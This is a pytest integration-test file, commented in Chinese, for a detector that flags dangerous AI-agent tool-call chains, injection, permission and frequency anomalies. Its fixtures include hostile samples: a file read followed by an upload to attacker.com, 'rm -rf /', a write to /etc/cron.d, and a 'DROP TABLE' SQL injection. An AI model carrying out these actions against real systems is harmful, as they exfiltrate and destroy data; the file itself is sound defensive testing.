"""
集成测试
测试整个检测系统的完整流程
"""
import pytest
import json
import os
from pathlib import Path
from src.core.detector import RealTimeDetector
from src.models.input import ToolCallInput
from datetime import datetime


class TestIntegration:
    """集成测试类"""
    
    @pytest.fixture
    def detector(self):
        """创建检测器实例"""
        return RealTimeDetector(rules_dir="src/rules")
    
    def test_detector_init(self, detector):
        """测试检测器初始化"""
        assert detector is not None
        assert hasattr(detector, "chain_matcher")
        assert hasattr(detector, "permission_checker")
        assert hasattr(detector, "injection_checker")
        assert hasattr(detector, "frequency_checker")
        assert hasattr(detector, "risk_scorer")
    
    def test_normal_session(self, detector):
        """测试正常会话"""
        # 加载正常会话数据
        test_file = "examples/normal_chains/normal_session.json"
        if not os.path.exists(test_file):
            pytest.skip(f"测试文件不存在: {test_file}")
        
        with open(test_file, "r", encoding="utf-8") as f:
            data = json.load(f)
        
        # 处理每个工具调用
        all_alerts = []
        for call_data in data["tool_calls"]:
            timestamp = datetime.fromisoformat(call_data["timestamp"].replace("Z", "+00:00"))
            tool_call = ToolCallInput(
                tool_name=call_data["tool_name"],
                arguments=call_data.get("arguments", {}),
                timestamp=timestamp,
                session_id=data.get("session_id", "test"),
                agent_name=data.get("agent_name", "test")
            )
            alerts = detector.on_tool_call(tool_call)
            all_alerts.extend(alerts)
        
        # 正常会话不应该有严重告警
        critical_alerts = [a for a in all_alerts if a.risk_level == "critical"]
        assert len(critical_alerts) == 0, f"正常会话不应该有 critical 告警: {critical_alerts}"
    
    def test_attack_session(self, detector):
        """测试攻击会话"""
        # 加载攻击会话数据
        test_file = "examples/dangerous_chains/attack_session.json"
        if not os.path.exists(test_file):
            pytest.skip(f"测试文件不存在: {test_file}")
        
        with open(test_file, "r", encoding="utf-8") as f:
            data = json.load(f)
        
        # 处理每个工具调用
        all_alerts = []
        for call_data in data["tool_calls"]:
            timestamp = datetime.fromisoformat(call_data["timestamp"].replace("Z", "+00:00"))
            tool_call = ToolCallInput(
                tool_name=call_data["tool_name"],
                arguments=call_data.get("arguments", {}),
                timestamp=timestamp,
                session_id=data.get("session_id", "test"),
                agent_name=data.get("agent_name", "test")
            )
            alerts = detector.on_tool_call(tool_call)
            all_alerts.extend(alerts)
        
        # 攻击会话应该有告警
        assert len(all_alerts) > 0, "攻击会话应该有告警"
        
        # 应该有 CAPABILITY_CHAIN 类型的告警
        chain_alerts = [a for a in all_alerts if a.alert_type == "CAPABILITY_CHAIN"]
        assert len(chain_alerts) > 0, "应该有 CAPABILITY_CHAIN 告警"
    
    def test_capability_chain_patterns(self, detector):
        """测试能力链模式检测"""
        # 测试几个典型的能力链模式
        test_cases = [
            {
                "name": "data_exfiltration",
                "tools": [
                    ("read_file", {"path": "/data/file.txt"}),
                    ("http_request", {"url": "https://attacker.com/exfiltrate"})
                ],
                "expected_alert": "CAPABILITY_CHAIN"
            },
            {
                "name": "sql_to_rce",
                "tools": [
                    ("execute_sql", {"query": "SELECT * FROM users"}),
                    ("shell", {"command": "rm -rf /"})
                ],
                "expected_alert": "CAPABILITY_CHAIN"
            },
            {
                "name": "privilege_escalation",
                "tools": [
                    ("read_file", {"path": "/data/file.txt"}),
                    ("write_file", {"path": "/etc/cron.d/malicious"}),
                    ("shell", {"command": "rm -rf /"})
                ],
                "expected_alert": "CAPABILITY_CHAIN"
            }
        ]
        
        for case in test_cases:
            # 创建新的检测器实例
            detector = RealTimeDetector(rules_dir="src/rules")
            
            alerts = []
            for i, (tool_name, arguments) in enumerate(case["tools"]):
                tool_call = ToolCallInput(
                    tool_name=tool_name,
                    arguments=arguments,
                    timestamp=datetime.now(),
                    session_id=f"test_{case['name']}",
                    agent_name="test"
                )
                alerts.extend(detector.on_tool_call(tool_call))
            
            # 应该检测到告警
            assert len(alerts) > 0, f"模式 {case['name']} 应该检测到告警"
            
            # 应该有期望的告警类型
            alert_types = [a.alert_type for a in alerts]
            assert case["expected_alert"] in alert_types, \
                f"模式 {case['name']} 应该有 {case['expected_alert']} 告警"
    
    def test_injection_detection(self, detector):
        """测试注入检测"""
        # SQL 注入
        tool_call = ToolCallInput(
            tool_name="execute_sql",
            arguments={"query": "SELECT * FROM users; DROP TABLE users"},
            timestamp=datetime.now(),
            session_id="test_injection",
            agent_name="test"
        )
        alerts = detector.on_tool_call(tool_call)
        
        injection_alerts = [a for a in alerts if a.alert_type == "INJECTION_DETECTED"]
        assert len(injection_alerts) > 0, "应该检测到 SQL 注入"
    
    def test_permission_violation(self, detector):
        """测试权限违规检测"""
        # 调用禁止的工具
        tool_call = ToolCallInput(
            tool_name="execute_code",
            arguments={"code": "print('hello')"},
            timestamp=datetime.now(),
            session_id="test_permission",
            agent_name="test"
        )
        alerts = detector.on_tool_call(tool_call)
        
        permission_alerts = [a for a in alerts if a.alert_type == "PERMISSION_VIOLATION"]
        assert len(permission_alerts) > 0, "应该检测到权限违规"
    
    def test_frequency_anomaly(self, detector):
        """测试频率异常检测"""
        # 高频调用 critical 工具
        alerts = []
        for i in range(5):
            tool_call = ToolCallInput(
                tool_name="shell",
                arguments={"command": f"cmd{i}"},
                timestamp=datetime.now(),
                session_id="test_frequency",
                agent_name="test"
            )
            alerts.extend(detector.on_tool_call(tool_call))
        
        frequency_alerts = [a for a in alerts if a.alert_type == "FREQUENCY_ANOMALY"]
        assert len(frequency_alerts) > 0, "应该检测到频率异常"
    
    def test_param_grading_low_risk(self, detector):
        """测试参数定级：低风险参数"""
        # http_request 使用白名单内 URL
        tool_call = ToolCallInput(
            tool_name="read_file",
            arguments={"path": "/data/file.txt"},
            timestamp=datetime.now(),
            session_id="test_grading",
            agent_name="test"
        )
        detector.on_tool_call(tool_call)
        
        tool_call = ToolCallInput(
            tool_name="http_request",
            arguments={"url": "https://internal-api.com/data"},
            timestamp=datetime.now(),
            session_id="test_grading",
            agent_name="test"
        )
        alerts = detector.on_tool_call(tool_call)
        
        # 白名单 URL 参数定级为 medium，链模式可能跳过
        # 检查是否有跳过的警告
        assert len(detector.skipped_chain_warnings) >= 0
    
    def test_param_grading_high_risk(self, detector):
        """测试参数定级：高风险参数"""
        # read_file -> http_request(外部URL)
        tool_call = ToolCallInput(
            tool_name="read_file",
            arguments={"path": "/data/file.txt"},
            timestamp=datetime.now(),
            session_id="test_grading_bad",
            agent_name="test"
        )
        detector.on_tool_call(tool_call)
        
        tool_call = ToolCallInput(
            tool_name="http_request",
            arguments={"url": "https://attacker.com/exfiltrate"},
            timestamp=datetime.now(),
            session_id="test_grading_bad",
            agent_name="test"
        )
        alerts = detector.on_tool_call(tool_call)
        
        # 应该有 CAPABILITY_CHAIN 告警（外部 URL 参数定级为 critical）
        chain_alerts = [a for a in alerts if a.alert_type == "CAPABILITY_CHAIN"]
        assert len(chain_alerts) > 0, "参数高风险时应该有 CAPABILITY_CHAIN 告警"
    
    def test_multiple_sessions(self, detector):
        """测试多会话隔离"""
        # 会话 1
        tool_call = ToolCallInput(
            tool_name="shell",
            arguments={"command": "cmd1"},
            timestamp=datetime.now(),
            session_id="session1",
            agent_name="test"
        )
        detector.on_tool_call(tool_call)
        
        # 会话 2
        tool_call = ToolCallInput(
            tool_name="shell",
            arguments={"command": "cmd2"},
            timestamp=datetime.now(),
            session_id="session2",
            agent_name="test"
        )
        detector.on_tool_call(tool_call)
        
        # 两个会话的频率应该独立计算
        assert "session1" in detector.session_buffers
        assert "session2" in detector.session_buffers
    
    def test_alert_structure(self, detector):
        """测试告警结构"""
        tool_call = ToolCallInput(
            tool_name="execute_code",
            arguments={"code": "print('hello')"},
            timestamp=datetime.now(),
            session_id="test_structure",
            agent_name="test"
        )
        alerts = detector.on_tool_call(tool_call)
        
        if len(alerts) > 0:
            alert = alerts[0]
            assert hasattr(alert, "alert_id")
            assert hasattr(alert, "session_id")
            assert hasattr(alert, "alert_type")
            assert hasattr(alert, "risk_level")
            assert hasattr(alert, "risk_score")
            assert hasattr(alert, "details")
            assert hasattr(alert, "tool_chain")
            assert hasattr(alert, "timestamp")
            
            # 风险评分应该在 0-100 之间
            assert 0 <= alert.risk_score <= 100
            
            # 风险等级应该是有效的
            assert alert.risk_level in ["critical", "high", "medium", "low"]
    
    def test_long_chain_detection(self, detector):
        """测试长链检测"""
        # 创建一个长链
        tools = ["read_file", "parse_json", "calculate", "format_text", "send_email"]
        
        alerts = []
        for tool_name in tools:
            tool_call = ToolCallInput(
                tool_name=tool_name,
                arguments={},
                timestamp=datetime.now(),
                session_id="test_long_chain",
                agent_name="test"
            )
            alerts.extend(detector.on_tool_call(tool_call))
        
        # 长链应该能正常处理，不崩溃
        # 可能有告警，也可能没有
        assert isinstance(alerts, list)
    
    def test_nested_injection(self, detector):
        """测试嵌套参数注入检测"""
        tool_call = ToolCallInput(
            tool_name="execute_sql",
            arguments={
                "config": {
                    "query": "SELECT * FROM users; DROP TABLE users"
                }
            },
            timestamp=datetime.now(),
            session_id="test_nested",
            agent_name="test"
        )
        alerts = detector.on_tool_call(tool_call)
        
        injection_alerts = [a for a in alerts if a.alert_type == "INJECTION_DETECTED"]
        assert len(injection_alerts) > 0, "应该检测到嵌套参数中的注入"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
